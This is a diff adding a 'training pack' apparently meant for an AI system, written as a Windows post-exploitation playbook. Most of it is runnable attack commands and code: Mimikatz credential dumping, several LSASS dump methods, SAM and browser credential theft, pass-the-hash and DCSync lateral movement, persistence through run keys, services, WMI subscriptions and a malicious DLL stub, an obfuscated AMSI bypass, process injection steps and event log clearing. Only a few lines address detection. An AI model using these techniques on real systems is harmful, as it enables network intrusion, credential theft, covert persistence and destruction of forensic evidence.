@@ -1,0 +1,405 @@
+================================================================================
+TITAN AI — TRAINING PACK 042: WINDOWS POST-EXPLOITATION AND LATERAL MOVEMENT
+CREDENTIAL DUMPING, PERSISTENCE, LATERAL MOVEMENT, DEFENSE EVASION
+================================================================================
+
+================================================================================
+PART 1: INITIAL ACCESS AND ENUMERATION
+================================================================================
+
+--- SITUATIONAL AWARENESS ---
+
+BASIC ENUMERATION (CMD/PowerShell):
+  whoami                                    # Current user
+  whoami /all                               # User + groups + privileges
+  net user                                  # All local users
+  net localgroup administrators             # Who is local admin?
+  net group "Domain Admins" /domain         # Domain Admins list
+  systeminfo                                # OS, patches, uptime, domain
+  ipconfig /all                             # Network configuration
+  netstat -ano                              # Active connections (find C2 patterns)
+  tasklist /SVC                             # Running processes with services
+  sc query                                  # Running services
+  wmic product get name,version             # Installed software
+  reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall  # Installed apps
+
+DOMAIN ENUMERATION (PowerView):
+  Import-Module .\PowerView.ps1
+  
+  Get-Domain                               # Domain info
+  Get-DomainController                     # List domain controllers
+  Get-DomainUser -Identity administrator   # Specific user info
+  Get-DomainUser | Where-Object {$_.admincount -eq 1}  # Admin users
+  Get-DomainGroup "Domain Admins" -Properties members  # DA members
+  Get-DomainComputer | Select dnshostname,operatingsystem  # All computers
+  
+  Find-LocalAdminAccess     # Where is current user local admin? (queries all DCs)
+  Invoke-UserHunter         # Where are DA sessions? (find machines with DA logged in)
+
+AUTOMATED ENUMERATION:
+  SharpHound: BloodHound data collector (covered in Pack 033).
+  WinPEAS: Windows privilege escalation awesome script.
+  Seatbelt: C# post-exploitation enumeration tool.
+    Seatbelt.exe -group=all    # Run all checks
+    Seatbelt.exe CredEnum      # Credential enumeration only
+
+================================================================================
+PART 2: CREDENTIAL DUMPING
+================================================================================
+
+--- LSASS MEMORY DUMPING ---
+
+LSASS (Local Security Authority Subsystem Service): Stores:
+  NTLM hashes: For NTLM authentication.
+  Kerberos tickets: TGTs and service tickets.
+  Cleartext passwords (WDigest, legacy): Windows 7-era, sometimes still enabled.
+  
+MIMIKATZ (most common credential tool):
+  # Requires: SeDebugPrivilege (admin or debug rights)
+  
+  # Dump all credentials:
+  mimikatz# privilege::debug      # Enable SeDebugPrivilege
+  mimikatz# sekurlsa::logonpasswords   # Dump all logon credentials
+  
+  # Output includes per-session:
+  # Username: john.doe
+  # Domain: CORPORATE
+  # NTLM: aad3b435b51404eeaad3b435b51404ee    ← LM (empty/disabled)
+  # NTLM: fc525c9683e8fe067095ba2ddc971889    ← NTLM hash
+  # Password: (null) or cleartext if WDigest enabled
+  
+  # Dump Kerberos tickets:
+  mimikatz# sekurlsa::tickets /export   # Export .kirbi files to disk
+  
+  # DCSync (no LSASS touch — uses replication protocol):
+  mimikatz# lsadump::dcsync /domain:corp.local /user:krbtgt
+  # Returns: NT hash and AES keys of krbtgt → Golden Ticket
+
+LSASS DUMP WITHOUT MIMIKATZ (EDR evasion):
+  Method 1: Task Manager (if available)
+  Right-click lsass.exe → Create dump file → C:\Windows\Temp\lsass.DMP
+  Copy dump to attacker machine → Run mimikatz offline:
+  mimikatz# sekurlsa::minidump lsass.DMP
+  mimikatz# sekurlsa::logonpasswords
+  
+  Method 2: ProcDump (Sysinternals, signed Microsoft binary):
+  procdump.exe -accepteula -ma lsass.exe lsass.dmp
+  # Signed = less likely to be flagged. Still needs admin.
+  
+  Method 3: comsvcs.dll (LOLBIN):
+  # MiniDump export function built into comsvcs.dll
+  tasklist | findstr lsass    # Get LSASS PID (e.g., 688)
+  rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump 688 C:\lsass.dmp full
+  
+  Method 4: Shadow Copy:
+  # If Volume Shadow Copy exists: NTDS.dit + SYSTEM hive from VSS
+  vssadmin list shadows
+  copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\NTDS\NTDS.dit C:\
+  copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM C:\
+  
+  Method 5: Silenttrinity/PPLdump — dump protected LSASS:
+  PPLdump.exe lsass.exe lsass.dmp
+  # PPLdump: Bypass Process Protected Light (PPL) on LSASS.
+
+--- SAM DATABASE ---
+
+SAM (Security Account Manager): Local account hashes.
+Located: C:\Windows\System32\config\SAM
+Encrypted with: SYSTEM hive's boot key.
+
+OFFLINE DUMP:
+  reg save HKLM\SAM C:\sam.bak
+  reg save HKLM\SYSTEM C:\system.bak
+  # On attacker machine:
+  impacket-secretsdump -sam sam.bak -system system.bak LOCAL
+
+ONLINE DUMP (Mimikatz):
+  mimikatz# lsadump::sam    # Dumps local SAM hashes
+
+--- CREDENTIAL LOCATIONS ---
+
+Windows Credential Manager:
+  cmdkey /list              # List stored credentials
+  # Shows: MicrosoftOffice365, domain\admin, various saved creds
+  
+  # Dump with Mimikatz:
+  mimikatz# vault::cred /patch   # Dump credential manager
+  mimikatz# vault::list          # List vaults
+
+Browser credentials:
+  # Chrome/Edge: SQLite databases with AES-256 encrypted passwords.
+  # Key protected by DPAPI (user's master key).
+  
+  # SharpChromium: C# tool, dumps Chrome/Edge/Firefox passwords:
+  SharpChromium.exe logins
+  # SharpDPAPI: Dump DPAPI-protected credentials
+
+PowerShell history:
+  cat (Get-PSReadlineOption).HistorySavePath
+  # Or: %APPDATA%\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
+  # Often contains: Clear-text passwords in previous commands, API keys, database URIs.
+
+================================================================================
+PART 3: LATERAL MOVEMENT
+================================================================================
+
+--- PASS THE HASH ---
+
+  impacket-psexec DOMAIN/Administrator@192.168.1.50 -hashes :NTLM_HASH
+  impacket-wmiexec DOMAIN/Administrator@192.168.1.50 -hashes :NTLM_HASH
+  impacket-smbexec DOMAIN/Administrator@192.168.1.50 -hashes :NTLM_HASH
+  impacket-atexec DOMAIN/Administrator@192.168.1.50 -hashes :NTLM_HASH
+  
+  # Mimikatz PTH (Windows-to-Windows):
+  mimikatz# sekurlsa::pth /user:Administrator /domain:CORP /ntlm:HASH /run:cmd.exe
+
+--- PASS THE TICKET ---
+
+  # Export Kerberos tickets from Mimikatz:
+  mimikatz# sekurlsa::tickets /export    # Saves .kirbi files
+  
+  # Import specific ticket (TGT or service ticket):
+  mimikatz# kerberos::ptt Administrator@krbtgt-CORP.LOCAL.kirbi
+  
+  # Verify:
+  klist    # Show current tickets
+  
+  # Access service using ticket:
+  dir \\DC01\ADMIN$    # Uses imported TGT to get service ticket automatically
+
+--- OVERPASS THE HASH ---
+
+Convert NTLM hash to Kerberos TGT (useful when NTLM blocked, Kerberos allowed):
+  mimikatz# sekurlsa::pth /user:Administrator /domain:CORP.LOCAL \
+    /ntlm:NTLM_HASH /aes256:AES_HASH /run:PowerShell.exe
+  # New process has: Administrator's identity via Kerberos.
+  # klist shows: TGT for Administrator.
+
+--- WMI LATERAL MOVEMENT ---
+
+  # Execute command on remote machine using WMI:
+  Invoke-WmiMethod -Class Win32_Process -Name Create \
+    -ComputerName TARGET -ArgumentList "powershell.exe -enc BASE64_PAYLOAD"
+  
+  # Or with credentials:
+  $cred = Get-Credential
+  Invoke-WmiMethod -Class Win32_Process -Name Create \
+    -ComputerName TARGET -Credential $cred \
+    -ArgumentList "cmd.exe /c whoami > C:\output.txt"
+
+--- WINRM / POWERSHELL REMOTING ---
+
+  # Connect to remote machine via WinRM:
+  Enter-PSSession -ComputerName TARGET -Credential (Get-Credential)
+  
+  # Run command remotely:
+  Invoke-Command -ComputerName TARGET -ScriptBlock { whoami; hostname }
+  
+  # With stored credential:
+  $cred = New-Object System.Management.Automation.PSCredential("CORP\Admin", $secpass)
+  Invoke-Command -ComputerName TARGET -Credential $cred -ScriptBlock { cmd.exe /c dir C:\ }
+
+--- DCsync (DOMAIN CONTROLLER "REACH") ---
+
+  # From machine with replication rights (Domain Admin, Enterprise Admin, or
+  # accounts specifically granted Replicating Directory Changes):
+  impacket-secretsdump CORP.LOCAL/Administrator@192.168.1.10 \
+    -hashes :NTLM_HASH -just-dc-ntlm
+  # Dumps ALL NT hashes from the domain. No need to be on DC.
+  # Returns: All user NT hashes, krbtgt hash, machine account hashes.
+
+================================================================================
+PART 4: PERSISTENCE MECHANISMS
+================================================================================
+
+--- REGISTRY RUN KEYS ---
+
+  # Run on user login:
+  reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run \
+    /v Updater /t REG_SZ \
+    /d "C:\Windows\Temp\beacon.exe" /f
+  
+  # Run on ANY user login (requires admin):
+  reg add HKLM\Software\Microsoft\Windows\CurrentVersion\Run \
+    /v WindowsUpdater /t REG_SZ \
+    /d "C:\Windows\Temp\beacon.exe" /f
+
+--- SCHEDULED TASKS ---
+
+  # Create scheduled task (requires admin for SYSTEM context):
+  schtasks /create /tn "Windows Update Task" \
+    /tr "C:\Windows\Temp\beacon.exe" \
+    /sc ONLOGON /ru SYSTEM /f
+  
+  # PowerShell:
+  $action = New-ScheduledTaskAction -Execute 'C:\Windows\Temp\beacon.exe'
+  $trigger = New-ScheduledTaskTrigger -AtStartup
+  Register-ScheduledTask -Action $action -Trigger $trigger \
+    -TaskName "SecurityHealthService" -RunLevel Highest
+
+--- SERVICES ---
+
+  sc create "WindowsNetworkService" \
+    binpath= "C:\Windows\Temp\beacon.exe" \
+    start= auto
+  net start WindowsNetworkService
+
+--- WMI EVENT SUBSCRIPTION (stealthy, no files on disk) ---
+
+  # WMI event subscriptions persist across reboots. No startup entries. Very stealthy.
+  # Requires admin.
+  
+  $filterName = "WindowsAuditFilter"
+  $consumerName = "WindowsAuditConsumer"
+  
+  # Event filter: Trigger on startup (every 60 seconds since boot)
+  $Filter = Set-WmiInstance -Namespace root\subscription -Class __EventFilter -Arguments @{
+      Name = $filterName
+      EventNamespace = "root\cimv2"
+      QueryLanguage = "WQL"
+      Query = "SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System' AND TargetInstance.SystemUpTime >= 240 AND TargetInstance.SystemUpTime < 325"
+  }
+  
+  # Consumer: What to run
+  $Consumer = Set-WmiInstance -Namespace root\subscription -Class CommandLineEventConsumer -Arguments @{
+      Name = $consumerName
+      ExecutablePath = "C:\Windows\Temp\beacon.exe"
+      CommandLineTemplate = "C:\Windows\Temp\beacon.exe"
+  }
+  
+  # Binding: Connect filter to consumer
+  Set-WmiInstance -Namespace root\subscription -Class __FilterToConsumerBinding -Arguments @{
+      Filter = $Filter
+      Consumer = $Consumer
+  }
+  
+  # Detection: WMI subscriptions are often missed.
+  # Query to find: Get-WMIObject -Namespace root\subscription -Class __FilterToConsumerBinding
+
+--- DLL HIJACKING ---
+
+  # Applications search for DLLs in specific order. If writable dir comes before system32:
+  # 1. Application directory
+  # 2. System32
+  # 3. Windows directory
+  # 4. Current directory
+  # 5. PATH directories
+  
+  # Find missing DLLs with Process Monitor:
+  # Filter: Path contains .dll, Result = NAME NOT FOUND
+  # In writable path: Drop your malicious DLL with that name.
+  
+  # DLL export stub (to maintain app functionality):
+  cat > malicious.c << 'EOF'
+  #include <windows.h>
+  
+  BOOL APIENTRY DllMain(HMODULE hModule, DWORD dwReason, LPVOID lpReserved) {
+      if (dwReason == DLL_PROCESS_ATTACH) {
+          // Persistence: Add our payload
+          WinExec("C:\\Windows\\Temp\\beacon.exe", SW_HIDE);
+      }
+      return TRUE;
+  }
+  EOF
+
+================================================================================
+PART 5: DEFENSE EVASION
+================================================================================
+
+--- AMSI BYPASS (Anti-Malware Scan Interface) ---
+
+AMSI: Windows interface that connects PowerShell/JScript/VBA to AV engines.
+Every script execution: Submitted to AV via AMSI before running.
+Bypass: Patch amsi.dll in memory to always return "clean."
+
+Classic (heavily detected):
+  [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
+
+Obfuscated modern bypass:
+  $a = 'Am' + 'siU' + 'tils'
+  $b = 'amsi' + 'Init' + 'Failed'
+  [Ref].Assembly.GetType('System.Management.Automation.'+$a).GetField($b,'NonPublic,Static').SetValue($null,$true)
+
+Memory patch (most reliable):
+  # Patch AmsiScanBuffer function to return clean (0x80070057 = E_INVALIDARG)
+  # Written in C# or via memory manipulation in PowerShell:
+  # Find amsi.dll in memory, find AmsiScanBuffer, patch return value.
+  # Tools: AmsiBypass.ps1, various open-source implementations.
+
+--- POWERSHELL CONSTRAINED LANGUAGE MODE (CLM) BYPASS ---
+
+CLM: Limits PowerShell functionality (no .NET calls, no P/Invoke, etc.).
+Active when: AppLocker policy or WDAC policy is enforced.
+
+Check: $ExecutionContext.SessionState.LanguageMode
+Full Language Mode: No restrictions.
+Constrained Language Mode: Restricted.
+
+Bypasses:
+  1. PowerShell v2: Fall back to old engine without CLM support.
+     powershell -v 2 -exec bypass -c "whoami"
+     (Only works if PS v2 is installed)
+  
+  2. Custom runspace: Create new PowerShell runspace from .NET (CLM applies to console, not all runspaces).
+  
+  3. Writable AppLocker policy location: Drop script there (allowed paths).
+     Check: Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections
+  
+  4. WDAC bypass: More complex. Requires signing or finding an allowed binary.
+
+--- PROCESS INJECTION TECHNIQUES ---
+
+Classic CreateRemoteThread injection:
+  1. OpenProcess(PROCESS_ALL_ACCESS, target_pid)
+  2. VirtualAllocEx(hProcess, NULL, shellcode_size, MEM_COMMIT, PAGE_EXECUTE_READWRITE)
+  3. WriteProcessMemory(hProcess, alloc_addr, shellcode, shellcode_size)
+  4. CreateRemoteThread(hProcess, NULL, 0, alloc_addr, NULL, 0, NULL)
+  
+  EDR detection: VirtualAllocEx + WriteProcessMemory + CreateRemoteThread = strong signal.
+
+Process Hollowing (more stealthy):
+  1. Create legitimate process suspended: CreateProcess(..."svchost.exe"..., CREATE_SUSPENDED)
+  2. Unmap legitimate code: NtUnmapViewOfSection(hProcess, pBaseAddr)
+  3. Allocate new space: VirtualAllocEx at same base address
+  4. Write malicious PE: WriteProcessMemory
+  5. Set new entry point: SetThreadContext(hThread, ...)
+  6. Resume: ResumeThread(hThread)
+  
+  Result: svchost.exe process in task list, but running attacker's code.
+
+Early Bird injection (APC-based):
+  1. Create suspended process: CreateProcess(CREATE_SUSPENDED)
+  2. Allocate shellcode: VirtualAllocEx + WriteProcessMemory
+  3. Queue APC: QueueUserAPC(shellcode_addr, hThread, NULL)
+  4. Resume: ResumeThread
+  5. First thing thread does: Runs queued APC (our shellcode).
+  
+  Evades: Many hooks placed AFTER thread starts. APC runs before hooks established.
+
+--- EVENT LOG TAMPERING ---
+
+  # Clear Windows Event Logs (requires admin, leaves clearing event):
+  wevtutil cl Security
+  wevtutil cl System
+  wevtutil cl Application
+  
+  # Clear all logs:
+  Get-EventLog -List | ForEach-Object { Clear-EventLog $_.Log }
+  
+  # Specific event deletion (more surgical, no "log cleared" event):
+  # Requires: Custom tools or direct manipulation of .evtx files.
+  # Invoke-Phant0m: Kill event logging service threads specifically.
+  
+  # Defense: Ship logs to SIEM immediately. Log deletion is too late.
+  # Microsoft Sentinel / Splunk: Logs arrive before attacker can delete.
+
+================================================================================
+END OF PACK 042: WINDOWS POST-EXPLOITATION
+Total: Situational awareness commands (CMD/PowerShell/PowerView), credential dumping
+(Mimikatz full workflow, LSASS dump 5 methods including comsvcs.dll LOLBIN/shadow copy,
+SAM offline/online, credential manager, browser creds, PS history), lateral movement
+(PTH/PTT/overpass-the-hash, WMI execution, WinRM/PSRemoting, DCSync with impacket),
+persistence (registry run keys, scheduled tasks, services, WMI event subscriptions,
+DLL hijacking), defense evasion (AMSI bypass techniques, CLM bypass options, process
+injection — CreateRemoteThread/process hollowing/early bird APC, event log tampering).
+================================================================================
